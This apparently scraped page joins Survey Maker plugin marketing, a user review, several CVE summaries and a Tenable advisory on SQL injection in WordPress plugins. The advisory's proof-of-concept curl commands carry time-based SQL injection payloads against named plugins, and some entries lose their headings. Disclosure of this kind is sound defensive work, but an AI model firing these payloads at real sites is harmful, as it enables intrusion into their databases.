#### RESTRICTIONS

*Are you looking for trends, customer buying behaviors, or do you need to see beyond the big picture?* It is possible to do with the Survey Maker plugin.

After enabling it, you will start to precisely target the audience, and not receive unneeded submissions from those, who have not signed in on your website. But it is not yet all, that our feedback form builder offers. It also has a functionality called the **Maximum number of attempts** per user. It will help you to not receive multiple submissions from the same respondent, which can cause a deviation from the accuracy of your results. The Survey plugin suggests two methods to prevent repeat voting from the same person. Those are the **Detect users by IP** or **Detect users by WP user ID**.

#### Create smart and interactive surveys (Pro)

Create a form using the **jump logic (skip logic)** function and don’t annoy the participants with unrelated questions. Due to this feature, the system will automatically select which question to ask based on the participants’ answers.

Survey Maker gives you the ability to make the quizzes more engaging for the users. Just activate the **chat mode** option, and the users will have the feeling of having a face-to-face chat with the device.

The program seemed decent enough on the demo that we bought the lifetime for it. After settling in to get to know the program, I’ve run into a number of issues such as:
Certain results not being visible when looking at individual resultsSaving only working for the first few survey sections and/or survey questionsOccasional issues with adding bulk answers to the wrong part of the survey
I’d love to be able to keep using the plugin, but it can’t even save a survey properly. I kept having to save after each edit to see if it would work or not. After a while of semi frequent faults in the saves, it began to not save any new changes at all. It would still let me know it saved, but it didn’t actually.
I am currently in contact with support over this last issue, and if it cannot be resolved, then I will not be able to continue using this plugin in any manner.

I think so far it is not really differing from the Quizmaker plugin, which also coule be used for surveys, despite Quizmakre is so far somewhat better translated and also showing under its original name and not a translated one in wordpress, which makes it easier to find.

  ###### medium

  GitHub Desktop is an open-source Electron-based GitHub app designed for git development. An attacker convincing a user to clone a repository directly or through a submodule can allow the attacker access to the user's credentials through the use of maliciously crafted remote URL. GitHub Desktop relies on Git to perform all network related operations (such as cloning, fetching, and pushing). When a user attempts to clone a repository GitHub Desktop will invoke `git clone` and when Git encounters a remote which requires authentication it will request the credentials for that remote host from GitHub Desktop using the git-credential protocol. Using a maliciously crafted URL it's possible to cause the credential request coming from Git to be misinterpreted by Github Desktop such that it will send credentials for a different host than the host that Git is currently communicating with thereby allowing for secret exfiltration. GitHub username and OAuth token, or credentials for other Git remote hosts stored in GitHub Desktop could be improperly transmitted to an unrelated host. Users should update to GitHub Desktop 3.4.12 or greater which fixes this vulnerability. Users who suspect they may be affected should revoke any relevant credentials.
* ##### [CVE-2025-0502](https://www.tenable.com/cve/CVE-2025-0502)

  ###### medium

  Transmission of Private Resources into a New Sphere ('Resource Leak') vulnerability in CrafterCMS Engine on Linux, MacOS, x86, Windows, 64 bit, ARM allows Directory Indexing, Resource Leak Exposure.This issue affects CrafterCMS: from 4.0.0 before 4.0.8, from 4.1.0 before 4.1.6.

  ###### medium

  A vulnerability classified as problematic has been found in wuzhicms 4.1.0. This affects the function test of the file coreframe/app/search/admin/config.php. The manipulation of the argument sphinxhost/sphinxport leads to server-side request forgery. It is possible to initiate the attack remotely. The exploit has been disclosed to the public and may be used.
* ##### [CVE-2024-52005](https://www.tenable.com/cve/CVE-2024-52005)

  ###### high

  Git is a source code management tool. When cloning from a server (or fetching, or pushing), informational or error messages are transported from the remote Git process to the client via the so-called "sideband channel". These messages will be prefixed with "remote:" and printed directly to the standard error output. Typically, this standard error output is connected to a terminal that understands ANSI escape sequences, which Git did not protect against. Most modern terminals support control sequences that can be used by a malicious actor to hide and misrepresent information, or to mislead the user into executing untrusted scripts. As requested on the git-security mailing list, the patches are under discussion on the public mailing list. Users are advised to update as soon as possible. Users unable to upgrade should avoid recursive clones unless they are from trusted sources.

# SQL Injection in Multiple WordPress Plugins

Critical

[← View More Research Advisories](/security/research)
### Synopsis

Joshua Martinelle of Tenable Research discovered multiple SQL Injection vulnerabilities across a number of WordPress plugins. This advisory will track each vulnerability as information and fixes become available.

---

**Paid Memberships Pro : CVE-2023-23488 - Unauthenticated SQL Injection**

**Reference:** https://wordpress.org/plugins/paid-memberships-pro

**Affected Versions:** < 2.9.8

**CVSSv3 Vector:**CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

**CVSSv3 Score:** 9.8

The plugin does not escape the 'code' parameter in the /pmpro/v1/order REST route before using it in a SQL statement, leading to an unauthenticated SQL injection vulnerability.

**Proof of Concept:**

Where TARGET\_HOST is the address of the wordpress host with Paid Memberships Pro installed, the following proof of concept uses the SLEEP function to demonstrate the SQL injection. Changing the value passed to sleep will alter how long the request takes to return.

```

curl "http://TARGET_HOST/?rest_route=/pmpro/v1/order&code=a%27%20OR%20(SELECT%201%20FROM%20(SELECT(SLEEP(2)))a)--%20-"
```

For example, running this twice with the "time" command will show the difference in response times:

```

time curl "http://TARGET_HOST/?rest_route=/pmpro/v1/order&code=a%27%20OR%20(SELECT%201%20FROM%20(SELECT(SLEEP(1)))a)--%20-"
{}
real    0m3.068s
user    0m0.006s
sys    0m0.009s

time curl "http://TARGET_HOST/?rest_route=/pmpro/v1/order&code=a%27%20OR%20(SELECT%201%20FROM%20(SELECT(SLEEP(2)))a)--%20-"
{}
real    0m6.095s
user    0m0.006s
sys    0m0.009s
```

**Easy Digital Downloads: CVE-2023-23489 - Unauthenticated SQL Injection

Reference:** https://wordpress.org/plugins/easy-digital-downloads/

**Affected Versions:**3.1.0.2 & 3.1.0.3

**CVSSv3 Vector:**CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

**CVSSv3 Score:** 9.8

The plugin does not escape the 's' parameter in the 'edd\_download\_search' action before using it in a SQL statement, leading to an unauthenticated SQL injection vulnerability.

The vulnerable part of the code corresponds to the 'edd\_ajax\_download\_search()' function of the './includes/ajax-functions.php' file.

**Proof of Concept:**

Where TARGET\_HOST is the address of the wordpress host with Paid Memberships Pro installed, the following proof of concept uses the SLEEP function to demonstrate the SQL injection. Changing the value passed to sleep will alter how long the request takes to return.

*Note:* The same SQL injection/unique request will not work twice in a row right away, as the 'edd\_ajax\_download\_search()' function stores the most recent search for 30 seconds (so to run the same payload again, you will have to modify the payload slightly or wait 30 seconds).

```

curl "http://TARGET_HOST/wp-admin/admin-ajax.php?action=edd_download_search&s=1'+AND+(SELECT+1+FROM+(SELECT(SLEEP(2)))a)--+-"

```

---

**Survey Maker: CVE-2023-23490 - Authenticated SQL Injection

Reference:**https://wordpress.org/plugins/survey-maker

**Affected Versions:** < 3.1.2

**CVSSv3 Vector:**CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

**CVSSv3 Score:** 8.8

The plugin does not escape the ‘surveys\_ids’ parameter in the 'ays\_surveys\_export\_json' action before using it in a SQL statement, leading to an authenticated SQL injection vulnerability.

The vulnerability requires the attacker to be authenticated but does not require administrator privileges, the following example uses an account with the 'subscriber' privilege level.

**Proof of concept:**

A simple curl command can be used to demonstrate the issue (though it requires a valid / current WP session cookie). In the proof of concept below, replace $TARGET\_HOST with the target wordpress instance, and $WP\_COOKIE with the full cookie header (i.e. "Cookie : wordpress\_xyz...") for a logged-in WP user.

```

curl "http://$TARGET_HOST/wp-admin/admin-ajax.php" --header "$WP_COOKIE" --data "action=ays_surveys_export_json&surveys_ids[0]=1)+AND+(SELECT+1+FROM+(SELECT(SLEEP(3)))a)--+-"

```

---

**ReviewX: CVE-2023-26325 - Authenticated SQL Injection

Reference:**https://wordpress.org/plugins/reviewx/

**Affected Versions:** <= 1.6.6

**CVSSv3 Vector:**CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

**CVSSv3 Score:** 8.8

The plugin does not escape the 'filterValue' or 'selectedColumns' parameters in the rx\_export\_review action before using them in a SQL statement, leading to a SQL injection.

The vulnerability requires the attacker to be authenticated but does not require administrator privileges, the following example uses an account with the 'subscriber' privilege level.

**Proof of concept:**

A simple curl command can be used to demonstrate the issue (though it requires a valid / current WP session cookie). In the proof of concept below, replace $TARGET\_HOST with the target wordpress instance, and $WP\_COOKIE with the full cookie header (i.e. "Cookie : wordpress\_xyz...") for a logged-in WP user.

```

curl "http://$TARGET_HOST/wp-admin/admin-ajax.php" --header "$WP_COOKIE" --data "action=rx_export_review&filterValue[0]=&filterValue[1]=&filterValue[2]=&filterValue[3]=&filterValue[4]=all&filterValue[5]=&filterValue[6]=aaaa&filterValue[7]=id+AND+(SELECT+1+FROM+(SELECT(SLEEP(5)))a)&filterValue[8]=desc&selectedColumns[0]=id"
```

**Waiting: One-click Countdowns: CVE-2023-28659 - Authenticated SQL Injection

Reference:**https://wordpress.org/plugins/waiting/

**Affected Versions:** <= 0.6.2

**CVSSv3 Vector:**CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

**CVSSv3 Score:** 8.8

The **pbc\_down[meta][id]** parameter of the **pbc\_save\_downs** action is vulnerable to SQL injection.

The vulnerability requires the attacker to be authenticated but does not require administrator privileges, the following example uses an account with the 'subscriber' privilege level.

**Proof of concept:**

A simple curl command can be used to demonstrate the issue (though it requires a valid / current WP session cookie). In the proof of concept below, replace $TARGET\_HOST with the target wordpress instance, and $WP\_COOKIE with the full cookie header (i.e. "Cookie : wordpress\_xyz...") for a logged-in WP user.

```

curl "http://$TARGET_HOST/wp-admin/admin-ajax.php" --header "$WP_COOKIE" --data "action=pbc_save_downs&pbc_down[meta][id]=1+OR+(SELECT+1+FROM+(SELECT(SLEEP(1)))a)--"
```

**Events Made Easy: CVE-2023-28660 - Authenticated SQL Injection

Reference:**https://wordpress.org/plugins/events-made-easy/

**Affected Versions:** <= 2.3.14

**CVSSv3 Vector:**CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

**CVSSv3 Score:** 8.8

The plugin does not escape the '**search\_name**' parameter in the **eme\_recurrences\_list** action before using it in a SQL statement, leading to a SQL injection vulnerability.

The vulnerability requires the attacker to be authenticated but does not require administrator privileges, the following example uses an account with the 'subscriber' privilege level.

**Proof of concept:**

A simple curl command can be used to demonstrate the issue (though it requires a valid / current WP session cookie). In the proof of concept below, replace $TARGET\_HOST with the target wordpress instance, and $WP\_COOKIE with the full cookie header (i.e. "Cookie : wordpress\_xyz...") for a logged-in WP user.

```

curl "http://$TARGET_HOST/wp-admin/admin-ajax.php?action=eme_recurrences_list&search_name=1'{+}AND{+}(SELECT+1+FROM+(SELECT(SLEEP(0.5)))a)-{-}+{-}" --header "$WP_COOKIE"
```

Reference:**https://wordpress.org/plugins/wp-popup-banners/

**Affected Versions:** <= 1.2.5

**CVSSv3 Vector:**CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

**CVSSv3 Score:** 8.8

The plugin does not escape the '**value**' parameter in the **get\_popup\_data** action before using it in a SQL statement, leading to a SQL injection vulnerability.

The vulnerability requires the attacker to be authenticated but does not require administrator privileges, the following example uses an account with the 'subscriber' privilege level.

**Proof of concept:**

A simple curl command can be used to demonstrate the issue (though it requires a valid / current WP session cookie). In the proof of concept below, replace $TARGET\_HOST with the target wordpress instance, and $WP\_COOKIE with the full cookie header (i.e. "Cookie : wordpress\_xyz...") for a logged-in WP user.

```

curl "http://$TARGET_HOST/wp-admin/admin-ajax.php" --header "$WP_COOKIE" --data "action=get_popup_data&value=1+AND+(SELECT+1+FROM+(SELECT(SLEEP(1)))a)"
```

**CVSSv3 Vector:**CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

**CVSSv3 Score:** 9.8

The plugin does not escape the ‘**template**’ parameter in the **wpgv\_doajax\_voucher\_pdf\_save\_func** action before using it in a SQL statement, leading to a SQL injection vulnerability.

The vulnerability does not require authentication to trigger.

**Proof of concept:**

In the proof of concept below, replace $TARGET\_HOST with the target wordpress instance, and $WP\_COOKIE with the full cookie header (i.e. "Cookie : wordpress\_xyz...") for a logged-in WP user, and where $BASE64\_INJECTION is the base64 encoded SQL injection, for example:

**LTEgT1IgU0xFRVAoMik=** translates to **-1 OR SLEEP(2)**

```

curl "http://$TARGET_HOST/wp-admin/admin-ajax.php" --data "action=wpgv_doajax_voucher_pdf_save_func&template=$BASE64_INJECTION"
```

or with a proper payload:

```

curl "http://$TARGET_HOST/wp-admin/admin-ajax.php" --data "action=wpgv_doajax_voucher_pdf_save_func&template=LTEgT1IgU0xFRVAoMik="

```
